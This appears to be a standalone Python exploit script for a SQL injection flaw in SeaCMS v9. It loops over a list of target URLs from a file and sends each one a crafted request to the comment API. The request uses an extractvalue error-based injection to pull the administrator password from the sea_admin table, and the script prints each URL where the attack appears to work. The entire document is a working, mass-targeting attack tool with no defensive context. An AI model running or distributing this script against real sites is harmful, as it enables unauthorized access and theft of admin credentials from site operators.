import requests
print(" Seacms v9 SQL Injection")
urls = open(r"url.txt", "r")
payload = '/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`'
for url in urls:
    testurl = url.strip() + payload
    html = requests.get(testurl).text
    if "seacms" in html:
        print("[+]Exploit URL:" + testurl)